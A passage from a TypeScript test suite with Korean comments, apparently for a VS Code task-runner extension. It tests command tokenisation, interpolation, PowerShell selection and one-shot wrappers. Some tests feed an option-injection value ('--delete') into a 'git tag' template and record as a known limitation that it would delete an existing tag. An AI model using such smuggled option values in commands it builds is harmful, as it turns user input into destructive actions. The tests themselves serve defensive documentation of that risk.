	 * 보간하고 나서 공백으로 토큰화하면 보간값 안의 공백이 새 인자를 만들어,
	 * 옵션 주입과 경로 분리가 그대로 남는다.
	 */
	suite('보간 경계 보존', () => {
		const ctx = { input: { value: '--delete main' }, selectFile: { path: '/My Docs/a.txt' } };
		/** 실제 실행이 보는 argv (executable + args). */
		const argv = (template: string) => {
			const line = interpolateCommandPreservingTokens(template, ctx);
			const { executable, args } = mergeCommandAndArgs(line, []);
			return [executable, ...args];
		};

		/**
		 * `??` 는 사람이 띄어 쓰는 연산자라 참조 안에 공백이 있다. 토큰화가
		 * 보간보다 먼저 일어나므로, 토크나이저가 `${…}` 를 통째로 보지 않으면
		 * 체인이 `${a.x` · `??` · `b.y}` 로 부서져 **어느 것도 해석되지 않는다.**
		 * 같은 참조가 `shell` 타입과 `args` 에서는 동작해 원인을 찾기 어렵다.
		 */
		test('?? 체인이 명령 문자열에서도 해석된다', () => {
			const branchCtx = { pickFolder: { path: '/w/dbg dir' } };   // pickFile 분기는 꺼짐
			const line = interpolateCommandPreservingTokens('echo ${pickFile.path ?? pickFolder.path}', branchCtx);
			const { executable, args } = mergeCommandAndArgs(line, []);
			assert.deepStrictEqual([executable, ...args], ['echo', '/w/dbg dir'],
				'?? 체인이 리터럴로 남았다');
		});

		test('?? 체인이 전부 어긋나면 리터럴로 남는다 (조용히 비지 않는다)', () => {
			const line = interpolateCommandPreservingTokens('echo ${nope.a ?? alsoNope.b}', {});
			const { args } = mergeCommandAndArgs(line, []);
			assert.deepStrictEqual(args, ['${nope.a ?? alsoNope.b}'],
				'해석 못 한 참조가 조각나거나 사라졌다');
		});

		test('보간값의 공백이 새 인자를 만들지 않는다', () => {
			assert.deepStrictEqual(
				argv('git tag ${input.value}'),
				['git', 'tag', '--delete main'],
				'보간값이 여러 인자로 쪼개졌다'
			);
		});

		/**
		 * **토큰 경계 보존은 옵션 주입을 막지 않는다.** 처음 이 스위트를 쓰면서
		 * 위 케이스에 "옵션 주입 차단" 이라는 이름을 붙였는데 과장이었다 — 값이
		 * 명령 **끝**에 있어서 통째로 한 인자가 됐을 뿐이다. 보간 지점 뒤에
		 * 위치 인자가 오면 값이 선행 `-` 를 갖는 순간 그대로 옵션이 된다.
		 *
		 * 이 한계를 테스트로 고정해 둔다. 없애려면 값의 모양을 제약하거나
		 * (`validatePattern`) 위치 인자 앞에 `--` 를 두어야 하고, 그 판단은
		 * 명령마다 달라 우리가 일반적으로 대신할 수 없다.
		 */
		test('알려진 한계: 선행 `-` 는 여전히 옵션으로 읽힌다', () => {
			assert.deepStrictEqual(
				argv('git tag ${input.value} main'),
				['git', 'tag', '--delete main', 'main'],
				'토큰 경계는 지켜지지만(값이 한 인자) 그 인자가 옵션 자리에 온다'
			);
			// `--delete` 처럼 공백 없는 값이면 그대로 옵션 하나가 된다.
			const single = interpolateCommandPreservingTokens(
				'git tag ${input.value} main',
				{ input: { value: '--delete' } }
			);
			const { executable, args } = mergeCommandAndArgs(single, []);
			assert.deepStrictEqual(
				[executable, ...args], ['git', 'tag', '--delete', 'main'],
				'이것이 남아 있는 위험이다 — 기존 main 태그가 삭제된다'
			);
		});

		test('공백이 든 파일 경로가 하나의 인자로 남는다', () => {
			assert.deepStrictEqual(
				argv('cat ${selectFile.path}'),
				['cat', '/My Docs/a.txt']
			);
		});

		test('리터럴에 붙은 형태와 인용된 리터럴을 유지한다', () => {
			assert.deepStrictEqual(argv('make TARGET=${input.value}'), ['make', 'TARGET=--delete main']);
			assert.deepStrictEqual(
				interpolateCommandPreservingTokens('echo "a b" c', ctx),
				'"echo" "a b" "c"'
			);
		});

		test('quoteForCommandTokenizer 는 어떤 문자열이든 한 토큰으로 되돌린다', () => {
			// `${…}` 를 담은 값도 넣는다 — 토크나이저가 특별 취급하는 문자열이라
			// 왕복 불변식이 깨지기 가장 쉬운 자리다.
			for (const value of ['a b', 'a"b', 'a\\b', '', 'a\\"b', "it's", 'a  b', '${a b}', 'a ${x ?? y} b', '${']) {
				const round = tokenizeCommandLine(quoteForCommandTokenizer(value));
				assert.deepStrictEqual(
					round, [value],
					`왕복이 깨졌다: ${JSON.stringify(value)} → ${JSON.stringify(round)}`
				);
			}
		});

		/**
		 * 빈 보간값이 **인자를 사라지게 하면 뒤가 앞으로 당겨진다** — 옵션이
		 * 엉뚱한 값을 먹는다. 예전 토크나이저는 명시적 빈 인용(`""`)도 버렸다.
		 */
		test('빈 보간값은 빈 인자로 남아 뒤 인자를 당기지 않는다', () => {
			const line = interpolateCommandPreservingTokens(
				'tool --output ${empty.value} target',
				{ empty: { value: '' } }
			);
			const { executable, args } = mergeCommandAndArgs(line, []);
			assert.deepStrictEqual(
				[executable, ...args], ['tool', '--output', '', 'target'],
				'빈 값이 사라져 target 이 --output 의 값으로 먹혔다'
			);
		});

		test('인용 없는 연속 공백은 여전히 토큰을 만들지 않는다', () => {
			assert.deepStrictEqual(tokenizeCommandLine('git  commit -m msg'), ['git', 'commit', '-m', 'msg']);
		});

		/**
		 * 배열 참조는 `args` 에서만 여러 인자가 되고 명령 문자열에서는 통째로
		 * 인용됐다 — 여러 파일을 고른 사용자가 `"a.bin b.bin"` 이라는 **인자 한
		 * 칸**을 도구에 넘겼다. 같은 참조가 자리에 따라 다르게 동작하지 않도록
		 * 두 자리의 규칙을 하나로 맞춘 것을 여기서 묶는다.
		 */
		suite('명령 토큰의 배열 확장', () => {
			const pickCtx = { pick: { paths: ['/a/one.bin', '/b/two space.bin'], count: 2 } };
			const pickArgv = (template: string, context: any = pickCtx) => {
				const { executable, args } = mergeCommandAndArgs(
					interpolateCommandPreservingTokens(template, context), []);
				return [executable, ...args];
			};

			test('토큰 전체가 배열 참조면 항목마다 인자 하나가 된다', () => {
				assert.deepStrictEqual(
					pickArgv('ins ${pick.paths}'),
					['ins', '/a/one.bin', '/b/two space.bin'],
					'배열이 공백으로 이어 붙어 인자 한 칸이 됐다'
				);
			});

			test('항목의 공백은 여전히 경계를 만들지 않는다', () => {
				assert.deepStrictEqual(
					pickArgv('ins ${pick.paths} --out x'),
					['ins', '/a/one.bin', '/b/two space.bin', '--out', 'x'],
					'공백 든 경로가 두 인자로 쪼개졌다'
				);
			});

			test('리터럴에 붙은 형태는 펼치지 않는다 (args 와 같은 규칙)', () => {
				assert.deepStrictEqual(
					pickArgv('ins --file=${pick.paths}'),
					['ins', '--file=/a/one.bin /b/two space.bin'],
					'무엇을 의도했는지 알 수 없는 형태라 args 와 같이 이어 붙인다'
				);
			});

			test('빈 배열은 인자를 만들지 않는다', () => {
				assert.deepStrictEqual(
					pickArgv('ins ${opt.value} target', { opt: { value: [] } }),
					['ins', 'target'],
					'빈 배열이 빈 인자로 남으면 도구가 빈 문자열을 값으로 받는다'
				);
			});

			test('배열 아닌 값의 동작은 그대로다', () => {
				assert.deepStrictEqual(
					pickArgv('cat ${one.path}', { one: { path: '/My Docs/a.txt' } }),
					['cat', '/My Docs/a.txt']
				);
			});
		});
	});

	/**
	 * Windows 의 raw `shell` 계약 (0.6.49).
	 *
	 * **실행 자체는 macOS 에서 검증할 수 없다.** 그래서 계약을 순수 함수로
	 * 뽑아 여기서 고정한다 — 셸 선택, 연산자 지원 여부, 세 실행 모드가
	 * 공유하는 분기 순서, one-shot 스크립트 조립까지.
	 */
	suite('Windows raw shell 계약', () => {
		const withPwsh = {
			env: { PATH: 'C:\\ps' },
			isFile: (p: string) => p === 'C:\\ps\\pwsh.exe',
		};
		const withoutPwsh = {
			env: { PATH: 'C:\\bin' },
			isFile: (p: string) => p === 'C:\\bin\\node.exe',
		};

		test('PATH 에 있으면 이름, 없으면 전체 경로를 돌려준다', () => {
			assert.strictEqual(resolvePwshPath(withPwsh), 'pwsh.exe');
			assert.strictEqual(resolvePwshPath(withoutPwsh), undefined);
			// **PATH 에 없는 설치본은 이름만으로 띄울 수 없다.** 처음 구현은
			// 여기서 찾고도 `pwsh.exe` 만 반환해서 spawn 이 실패했다 — false
			// negative 를 줄이려던 보완이 확실한 실패를 만들었다.
			assert.strictEqual(resolvePwshPath({
				env: { PATH: 'C:\\bin', ProgramFiles: 'C:\\Program Files' },
				isFile: (p: string) => p === 'C:\\Program Files\\PowerShell\\7\\pwsh.exe',
			}), 'C:\\Program Files\\PowerShell\\7\\pwsh.exe');
			// PATH 키가 아예 없어도 죽지 않는다.
			assert.strictEqual(resolvePwshPath({ env: {}, isFile: () => false }), undefined);
		});

		test('chain 연산자가 없으면 pwsh 가 있어도 5.1 을 그대로 쓴다', () => {
			// 무조건 pwsh 를 선호하면 이미 동작하던 액션의 의미가 바뀐다 (PS 7 은
			// curl/wget 별칭을 없앴고 `>` 의 기본 인코딩도 다르다). 필요할 때만
			// 바꿔야 같은 actions.json 이 기계마다 다르게 돌지 않는다.
			assert.strictEqual(selectWindowsRawShell(false, 'pwsh.exe'), 'powershell.exe');
			assert.strictEqual(selectWindowsRawShell(false, undefined), 'powershell.exe');
			assert.strictEqual(selectWindowsRawShell(true, 'pwsh.exe'), 'pwsh.exe');
			assert.strictEqual(
				selectWindowsRawShell(true, 'C:\\PF\\PowerShell\\7\\pwsh.exe'),
				'C:\\PF\\PowerShell\\7\\pwsh.exe',
				'전체 경로를 그대로 흘려야 한다'
			);
			assert.strictEqual(selectWindowsRawShell(true, undefined), undefined);
		});

		test('rawCommandUsesChainOperators 는 && / || 만, 그리고 인용 밖에서만 본다', () => {
			assert.strictEqual(rawCommandUsesChainOperators('a && b'), true);
			assert.strictEqual(rawCommandUsesChainOperators('a || b'), true);
			// 5.1 도 파이프와 리다이렉션·세미콜론은 파싱한다 — 이것까지 막으면
			// 동작하는 명령을 우리가 거부하게 된다.
			assert.strictEqual(rawCommandUsesChainOperators('a | b'), false);
			assert.strictEqual(rawCommandUsesChainOperators('a > out.txt'), false);
			assert.strictEqual(rawCommandUsesChainOperators('a; b'), false);
			// **인용 안의 `&&` 는 연산자가 아니다.** `cmd /c "a && b"` 는 5.1 에서
			// chain 을 쓰는 정석 우회법이고 문서도 그 형태를 가르친다 — 이것을
			// 막으면 우회법 자체를 차단하면서 엉뚱한 안내를 하게 된다.
			assert.strictEqual(rawCommandUsesChainOperators('cmd /c "build && test"'), false);
			assert.strictEqual(rawCommandUsesChainOperators("git commit -m 'fix && cleanup'"), false);
			assert.strictEqual(rawCommandUsesChainOperators('grep -E "foo||bar" file'), false);
			// 인용 밖에 진짜 연산자가 함께 있으면 여전히 잡는다.
			assert.strictEqual(rawCommandUsesChainOperators('echo "a && b" && ls'), true);
		});

		test('5.1 에 && 를 넘기려 하면 원인과 해결책을 담아 실패한다', function () {
			if (process.platform !== 'win32') { this.skip(); }
			assert.throws(
				() => resolveRawShellExecutable('make && make flash', withoutPwsh),
				/PowerShell 7|pwsh/,
				'파스 오류로 넘기지 말고 이유를 설명해야 한다'
			);
			assert.strictEqual(resolveRawShellExecutable('make && make flash', withPwsh), 'pwsh.exe');
			assert.strictEqual(resolveRawShellExecutable('make flash', withoutPwsh), 'powershell.exe');
			// args 는 우리가 인용하므로 스캔 대상이 아니다 — command 만 넘긴다.
			assert.strictEqual(resolveRawShellExecutable('cmd /c "a && b"', withoutPwsh), 'powershell.exe');
		});

		test('Windows 실행 전략은 raw 단일 실행 파일 예외와 셸 문법을 구분한다', () => {
			// 스트림·one-shot·민감·캡처 경로가 이 함수를 공유한다. raw 여부만
			// 보고 "항상 raw-shell"로 결론내리면 단일 실행 파일의 명시적 args가
			// PowerShell 5.1에서 재파싱된다. 반대로 셸 문법을 native로 보내면
			// `&&`·`>`가 리터럴 인자가 된다.
			assert.strictEqual(resolveWindowsTaskSpawn(true, 'node', ['-e', 'x'], withoutPwsh).strategy, 'native');
			assert.strictEqual(resolveWindowsTaskSpawn(true, 'node > out.txt', [], withoutPwsh).strategy, 'raw-shell');
			assert.strictEqual(resolveWindowsTaskSpawn(true, 'node --version', [], withoutPwsh).strategy, 'raw-shell');
			assert.strictEqual(resolveWindowsTaskSpawn(false, 'node', ['-e', 'x'], withoutPwsh).strategy, 'native');
			assert.strictEqual(resolveWindowsTaskSpawn(false, 'echo', ['x'], withoutPwsh).strategy, 'powershell');
		});

		/** `-EncodedCommand` 페이로드를 되돌려 실제로 무엇이 넘어가는지 본다. */
		function decodeEncodedCommand(script: string): string {
			const m = script.match(/-EncodedCommand', '([A-Za-z0-9+/=]+)'/)
				?? script.match(/-EncodedCommand ([A-Za-z0-9+/=]+)/);
			assert.ok(m, `인코딩된 명령을 찾을 수 없다: ${script}`);
			return Buffer.from(m![1], 'base64').toString('utf16le');
		}

		suite('실제 분기 (win32 강제)', () => {
			function onWin32<T>(fn: () => T): T {
				const originalPlatform = process.platform;
				try {
					Object.defineProperty(process, 'platform', { value: 'win32' });
					return fn();
				} finally {
					Object.defineProperty(process, 'platform', { value: originalPlatform });
				}
			}

			test('one-shot raw 는 Start-Process 로 감싸고 원본 줄을 표시한다', () => {
				const result = onWin32(() => wrapCommandForOneShot(
					'echo hi > out.txt', [], 'C:\\proj', false, withoutPwsh.env, true, withoutPwsh
				));

				assert.strictEqual(result.isPowerShellScript, true);
				assert.ok(result.commandLine.startsWith("Start-Process -FilePath 'powershell.exe'"), result.commandLine);
				// **표시는 원본 줄이다** — 다른 형제 분기와 달리 여기만 다르다.
				// 스크립트를 그대로 보여주면 이력과 로그가 읽을 수 없게 된다.
				assert.strictEqual(result.displayCommand, 'echo hi > out.txt');
				// 이중 인코딩 계약: 안쪽 페이로드가 사용자 명령 그대로여야 한다.
				assert.strictEqual(decodeEncodedCommand(result.commandLine), 'echo hi > out.txt');
				// one-shot 은 종료 코드를 읽는 주체가 없어 후행부가 없어야 한다.
				assert.ok(!result.commandLine.includes('taskHubExitCode'), result.commandLine);
			});

			test('one-shot raw 는 useUtf8Console 을 안쪽 페이로드에 붙인다', () => {
				const result = onWin32(() => wrapCommandForOneShot(
					'echo hi', [], undefined, true, withoutPwsh.env, true, withoutPwsh
				));
				// one-shot 은 detach 되어 종료 코드를 아무도 읽지 않으므로
				// 후행부를 붙이지 않는다 — 그래서 여기서는 정확히 일치한다.
				assert.strictEqual(
					decodeEncodedCommand(result.commandLine),
					'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8;\n' +
					"$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8';\n" +
					'echo hi'
				);
			});

			test('one-shot raw 의 단일 실행 파일은 ProcessStartInfo 로 args 를 보존한다', () => {
				const result = onWin32(() => wrapCommandForOneShot(
					'node', ['-e', 'process.stdout.write("ok value")'], 'C:\\work', false,
					withoutPwsh.env, true, withoutPwsh
				));
				assert.strictEqual(result.isPowerShellScript, true);
				assert.ok(result.commandLine.includes('$psi.UseShellExecute = $false'), result.commandLine);
				assert.ok(result.commandLine.includes('process.stdout.write(\\"ok value\\")'), result.commandLine);
			});

			test('one-shot raw 는 5.1 에서 && 를 만나면 던진다', () => {
				assert.throws(
					() => onWin32(() => wrapCommandForOneShot(
						'make && make flash', [], undefined, false, withoutPwsh.env, true, withoutPwsh
					)),
					/PowerShell 7|pwsh/
				);
			});

			test('스트림 모드 raw 는 고른 인터프리터에 인코딩해 넘긴다', () => {
				const result = onWin32(() => createShellExecution(
					'echo hi && echo bye', [], {}, false, true, withPwsh
				));
				const exec = result.shellExecution as vscode.ShellExecution;
				// chain 연산자가 있으니 pwsh 로 간다.
				assert.strictEqual(exec.command, 'pwsh.exe');
				assert.strictEqual((exec.args?.[0] as string), '-NoProfile');
				const payload = decodeEncodedCommand(`-EncodedCommand ${exec.args?.[2] as string}`);
				assert.ok(payload.startsWith('echo hi && echo bye'), payload);
				// **종료 코드 후행부가 붙어야 한다.** powershell 은 외부 프로그램의
				// 종료 코드를 그대로 물려주지 않아, 이것이 없으면 코드 7 이 1 로
				// 뭉개진다 — 민감 one-shot 만 갖고 있던 처리를 세 경로에 맞췄다.
				assert.match(payload, /exit \[int\]\$taskHubExitCode/);
				assert.strictEqual(result.displayCommand, 'echo hi && echo bye');
			});

			test('스트림 모드 raw 의 단일 실행 파일은 native argv 로 실행한다', () => {
				const result = onWin32(() => createShellExecution(
					'node', ['-e', 'process.stdout.write("ok value")'], {}, false, true, withoutPwsh
				));
				assert.ok(result.shellExecution instanceof vscode.ProcessExecution);
				assert.strictEqual(
					(result.shellExecution as vscode.ProcessExecution).process,
					'C:\\bin\\node.exe'
				);
				assert.ok(result.displayCommand.startsWith('node '));
			});

			test('스트림 모드 raw 는 연산자가 없으면 5.1 을 그대로 쓴다', () => {
				const exec = onWin32(() => createShellExecution(
					'make flash', [], {}, false, true, withPwsh
				)).shellExecution as vscode.ShellExecution;
				assert.strictEqual(exec.command, 'powershell.exe');
			});
		});

		test('POSIX one-shot raw 는 sh -c 로 감싸 그룹과 리다이렉션을 지킨다', function () {
			if (process.platform === 'win32') { this.skip(); }
			// 예전에는 `nohup <line> >/dev/null 2>&1 &` 로 문자열을 그대로 끼워
			// 넣어서 (실측) ① 사용자의 `> out.txt` 가 우리 `>/dev/null` 에 덮이고
			// ② `sleep 3; touch m` 의 `;` 앞이 포그라운드에서 돌아 one-shot 이
			// detach 되지 않았다.
			const redirect = wrapCommandForOneShot('echo hi > out.txt', [], undefined, false, process.env, true);
			assert.ok(
				redirect.commandLine.includes("sh -c 'echo hi > out.txt'"),
				`사용자 리다이렉션이 래퍼 안에 갇히지 않았다: ${redirect.commandLine}`
			);
			assert.ok(redirect.commandLine.endsWith('>/dev/null 2>&1 &'));

			const sequence = wrapCommandForOneShot('sleep 3; touch m', [], undefined, false, process.env, true);
			assert.ok(
				sequence.commandLine.includes("sh -c 'sleep 3; touch m'"),
				`\`;\` 앞이 포그라운드로 남는다: ${sequence.commandLine}`
			);
			// 표시는 스크립트가 아니라 사용자 명령이다.
			assert.strictEqual(sequence.displayCommand, 'sleep 3; touch m');
		});

		test('one-shot 은 인터프리터를 Start-Process 로 떼어 내고 명령은 인코딩해 넘긴다', () => {
			const script = buildRawOneShotWindowsScript('pwsh.exe', 'QQBCAEMA', 'C:\\proj dir');
			assert.match(script, /^Start-Process -FilePath 'pwsh\.exe'/);
			assert.match(script, /-EncodedCommand', 'QQBCAEMA'/);
			// 공백이 든 경로가 인용된다.
			assert.ok(script.includes("-WorkingDirectory 'C:\\proj dir'"), script);
			assert.match(script, /-WindowStyle Hidden/);
			// cwd 가 없으면 그 인자를 아예 넣지 않는다.
			assert.ok(!buildRawOneShotWindowsScript('pwsh.exe', 'QQ', undefined).includes('-WorkingDirectory'));
		});
	});

	suite('quotePosixArgument', () => {
		test('should quote empty string', () => {
			const result = quotePosixArgument('');
			assert.strictEqual(result, "''");
		});

		test('should quote simple string', () => {
			const result = quotePosixArgument('hello');
			assert.strictEqual(result, "'hello'");
		});

		test('should escape single quotes', () => {
			const result = quotePosixArgument("don't");
			assert.strictEqual(result, "'don'\\''t'");
		});

		test('should handle string with spaces', () => {
			const result = quotePosixArgument('hello world');
			assert.strictEqual(result, "'hello world'");
		});
	});

	suite('tokenizeCommandLine', () => {
		test('should tokenize simple command', () => {
			const result = tokenizeCommandLine('echo hello');
			assert.deepStrictEqual(result, ['echo', 'hello']);
		});

		test('should tokenize command with multiple args', () => {
			const result = tokenizeCommandLine('ls -la /path/to/dir');
			assert.deepStrictEqual(result, ['ls', '-la', '/path/to/dir']);
		});

		test('should handle quoted arguments', () => {
			const result = tokenizeCommandLine('echo "hello world"');
			assert.deepStrictEqual(result, ['echo', 'hello world']);
		});

		test('should handle single-quoted arguments', () => {
			const result = tokenizeCommandLine("echo 'hello world'");
			assert.deepStrictEqual(result, ['echo', 'hello world']);
		});

		test('should handle escaped quotes', () => {
			const result = tokenizeCommandLine('echo "hello\\"world"');
			assert.deepStrictEqual(result, ['echo', 'hello"world']);
		});

		test('should handle path with spaces', () => {
			const result = tokenizeCommandLine('cat "/path/to/file name.txt"');
			assert.deepStrictEqual(result, ['cat', '/path/to/file name.txt']);
		});

		test('should handle empty command', () => {
			const result = tokenizeCommandLine('');
			assert.deepStrictEqual(result, []);
		});

		// `${…}` 안의 공백에서 자르면 `??` 체인이 부서진다. `command` 타입은 이
		// 토큰 목록을 만든 뒤 토큰마다 보간하므로(interpolateCommandPreservingTokens),
		// 부서진 조각은 어느 것도 해석되지 않고 리터럴로 넘어갔다 — 같은 참조가
		// `shell` 타입과 `args` 에서는 동작해서 원인을 찾기 어려운 종류의 실패다.
		test('`${…}` 는 안에 공백이 있어도 한 토큰이다 (?? 체인)', () => {
			assert.deepStrictEqual(
				tokenizeCommandLine('echo ${pickFile.path ?? pickFolder.path}'),
				['echo', '${pickFile.path ?? pickFolder.path}']
			);
			assert.deepStrictEqual(
				tokenizeCommandLine('t ${a.x ?? b.y ?? c.z} tail'),
				['t', '${a.x ?? b.y ?? c.z}', 'tail']
			);
		});

		test('참조가 토큰 가운데 있어도 한 토큰으로 남는다', () => {
			assert.deepStrictEqual(
				tokenizeCommandLine('tool --out=${a.x ?? b.y}.html'),
				['tool', '--out=${a.x ?? b.y}.html']
			);
		});

		test('참조의 끝은 첫 `}` — 보간기가 보는 경계와 같다', () => {
			// 보간기 정규식이 `\${([^}]+)}` 이므로 토큰 경계도 첫 `}` 여야
			// 토큰 하나가 참조 하나와 정확히 대응한다. 마지막 `}` 까지 탐욕적으로
			// 잡으면 아래가 ['tool', '${a.x} b}', 'c'] 가 되어 어긋난다.
			assert.deepStrictEqual(
				tokenizeCommandLine('tool ${a.x} b} c'),
				['tool', '${a.x}', 'b}', 'c']
			);
			assert.deepStrictEqual(
				tokenizeCommandLine('echo ${a.x} ${b.y}'),
				['echo', '${a.x}', '${b.y}']
			);
		});

		test('안쪽 `${` 도 첫 `}` 에서 끊는다 — 보간기와 같은 규칙', () => {
			// 잘못 쓴 형태(`${a.x ?? ${b.y}}`)지만, 토크나이저와 보간기가 **같은
			// 지점**에서 끊어야 진단이 실행 결과와 어긋나지 않는다.
			assert.deepStrictEqual(
				tokenizeCommandLine('echo ${a.x ?? ${b.y}} z'),
				['echo', '${a.x ?? ${b.y}}', 'z']
			);
		});

		test('참조 스캔은 인용을 보지 않는다 — 의도된 계약', () => {
			// 닫히지 않은 `${` 는 첫 `}` 를 찾아 인용 부호를 넘어서까지 삼킨다.
			// 고칠 수도 있지만, 그러면 토크나이저가 보간기(`\${([^}]+)}`)보다
			// 좁게 끊어 둘의 경계가 다시 어긋난다. 어차피 해석되지 않는 잘못된
			// 템플릿이므로 **경계 일치**를 우선한다. 이 검사는 그 선택을 고정한다.
			assert.deepStrictEqual(
				tokenizeCommandLine('tool ${a.x "b} c" d'),
				['tool', '${a.x "b}', 'c d']
			);
		});

		test('참조가 인용 옆에 붙으면 한 토큰으로 이어진다', () => {
			assert.deepStrictEqual(
				tokenizeCommandLine('echo "a"${x y}"b"'),
				['echo', 'a${x y}b']
			);
		});

		test('`${` 로 끝나면 그대로 남는다', () => {
			assert.deepStrictEqual(tokenizeCommandLine('echo ${'), ['echo', '${']);
		});

		test('닫히지 않은 `${` 가 많아도 선형으로 훑는다', () => {
			// `}` 가 없으면 `indexOf` 가 매번 끝까지 다시 훑어 O(n²) 가 된다.
			// 500KB 입력이 1.1초였고, 이 토크나이저는 Doctor 도 쓰므로 확장
			// 호스트가 그대로 멈춘다. 시간이 아니라 **증가율**을 본다 —
			// 느린 기계에서도 흔들리지 않는 기준이다.
			const measure = (size: number) => {
				const input = '${'.repeat(size);
				const started = Date.now();
				tokenizeCommandLine(input);
				return Math.max(1, Date.now() - started);
			};
			measure(1000);   // JIT 예열
			const small = measure(50_000);
			const large = measure(200_000);
			// 선형이면 4배, 2차면 16배. 여유를 크게 두어도 둘은 갈린다.
			assert.ok(large / small < 8,
				`입력이 4배일 때 시간이 ${(large / small).toFixed(1)}배 늘었다 — 선형이 아니다`);
		});

		test('닫히지 않은 `${` 는 참조가 아니므로 예전처럼 쪼갠다', () => {
			assert.deepStrictEqual(
				tokenizeCommandLine('echo ${broken chain'),
				['echo', '${broken', 'chain']
			);
		});

		test('평범한 `$` 와 인용은 종전 그대로다', () => {
			assert.deepStrictEqual(tokenizeCommandLine('echo $HOME a'), ['echo', '$HOME', 'a']);
			assert.deepStrictEqual(tokenizeCommandLine('echo "${a.x ?? b.y}"'), ['echo', '${a.x ?? b.y}']);
		});

		test('should handle multiple spaces', () => {
			const result = tokenizeCommandLine('echo    hello    world');
			assert.deepStrictEqual(result, ['echo', 'hello', 'world']);
		});

		test('should handle leading spaces', () => {
			const result = tokenizeCommandLine('   echo hello');
			assert.deepStrictEqual(result, ['echo', 'hello']);
		});

		test('should handle trailing spaces', () => {
			const result = tokenizeCommandLine('echo hello   ');
			assert.deepStrictEqual(result, ['echo', 'hello']);
		});

		test('should handle mixed quotes', () => {
			const result = tokenizeCommandLine('echo "hello" \'world\'');
			assert.deepStrictEqual(result, ['echo', 'hello', 'world']);
		});

		test('should handle escaped backslash in double quotes', () => {
			const result = tokenizeCommandLine('echo "C:\\\\path"');
			assert.deepStrictEqual(result, ['echo', 'C:\\path']);
		});

		test('should handle escaped quote in double quotes', () => {
			const result = tokenizeCommandLine('echo "hello\\"world"');
			assert.deepStrictEqual(result, ['echo', 'hello"world']);
		});

		test('should handle single character arguments', () => {
			const result = tokenizeCommandLine('ls -a -l');
			assert.deepStrictEqual(result, ['ls', '-a', '-l']);
		});

		test('should handle command with only quotes', () => {
			const result = tokenizeCommandLine('""');
			// 명시적 빈 인용은 **빈 인자** 를 뜻하므로 토큰으로 남는다 (0.6.50).
			// 예전에는 버렸는데, 그러면 빈 보간값이 든 인자가 통째로 사라지고
			// 뒤 인자가 앞으로 당겨져 옵션이 엉뚱한 값을 먹었다.
			assert.deepStrictEqual(result, ['']);
		});

		test('should handle unclosed quote', () => {
			const result = tokenizeCommandLine('echo "hello');
			assert.deepStrictEqual(result, ['echo', 'hello']);
		});

		test('should handle nested quotes', () => {
			const result = tokenizeCommandLine('echo "outer \'inner\' outer"');
			assert.deepStrictEqual(result, ['echo', "outer 'inner' outer"]);
		});

		test('should handle command with tabs and newlines', () => {
			const result = tokenizeCommandLine('echo\thello\nworld');
			assert.deepStrictEqual(result, ['echo', 'hello', 'world']);
		});
	});

	suite('formatActionPath', () => {
		test('should format path with parts', () => {
			const result = formatActionPath(['Folder1', 'Folder2', 'Action']);
			assert.strictEqual(result, 'Folder1 > Folder2 > Action');
		});

		test('should return "(root)" for empty array', () => {
			const result = formatActionPath([]);
			assert.strictEqual(result, '(root)');
		});

		test('should format single part', () => {
			const result = formatActionPath(['Action']);
			assert.strictEqual(result, 'Action');
		});

		test('should handle multiple parts', () => {
			const result = formatActionPath(['A', 'B', 'C', 'D']);
			assert.strictEqual(result, 'A > B > C > D');
		});
	});

	suite('mergeCommandAndArgs', () => {
		test('should merge command with extra args', () => {
			const result = mergeCommandAndArgs('echo hello', ['world']);
			assert.strictEqual(result.executable, 'echo');
			assert.deepStrictEqual(result.args, ['hello', 'world']);
		});

		test('should handle command without args', () => {
			const result = mergeCommandAndArgs('echo', ['hello', 'world']);
			assert.strictEqual(result.executable, 'echo');
			assert.deepStrictEqual(result.args, ['hello', 'world']);
		});

		test('should handle command with existing args', () => {
			const result = mergeCommandAndArgs('ls -la', ['-h']);
			assert.strictEqual(result.executable, 'ls');
			assert.deepStrictEqual(result.args, ['-la', '-h']);
		});

		test('should handle quoted command with spaces', () => {
			const result = mergeCommandAndArgs('"/path/to/app"', ['arg1']);
			assert.strictEqual(result.executable, '/path/to/app');
			assert.deepStrictEqual(result.args, ['arg1']);
		});

		test('should throw error for empty command', () => {
			assert.throws(() => {
				mergeCommandAndArgs('', []);
			}, /Cannot execute an empty command/);
		});

		test('should handle command with multiple existing args', () => {
			const result = mergeCommandAndArgs('git commit -m "message"', ['--no-verify']);
			assert.strictEqual(result.executable, 'git');
			assert.deepStrictEqual(result.args.length, 4);
			assert.strictEqual(result.args[0], 'commit');
			assert.strictEqual(result.args[1], '-m');
			assert.strictEqual(result.args[2], 'message');
			assert.strictEqual(result.args[3], '--no-verify');
		});
	});

	suite('handleStringManipulation', () => {
		test('should strip extension', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'stripExtension',
				input: '/path/to/file.txt'
			});
			assert.strictEqual(result.output, '/path/to/file');
		});

		test('should return basename', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'basename',
				input: '/path/to/file.txt'
			});
			assert.strictEqual(result.output, 'file.txt');
		});

		test('should return basename without extension', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'basenameWithoutExtension',
				input: '/path/to/file.txt'
			});
			assert.strictEqual(result.output, 'file');
		});

		test('should return dirname', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'dirname',
				input: '/path/to/file.txt'
			});
			assert.strictEqual(result.output, '/path/to');
		});

		test('should return extension', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'extension',
				input: '/path/to/file.txt'
			});
			assert.strictEqual(result.output, 'txt');
		});

		test('should convert to lowercase', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'toLowerCase',
				input: 'Hello World'
			});
			assert.strictEqual(result.output, 'hello world');
		});

		test('should convert to uppercase', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'toUpperCase',
				input: 'Hello World'
			});
			assert.strictEqual(result.output, 'HELLO WORLD');
		});

		test('should trim string', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'trim',
				input: '  hello world  '
			});
			assert.strictEqual(result.output, 'hello world');
		});

		test('should handle file without extension', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'stripExtension',
				input: '/path/to/file'
			});
			assert.strictEqual(result.output, '/path/to/file');
		});

		test('should handle empty extension', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'extension',
				input: '/path/to/file.'
			});
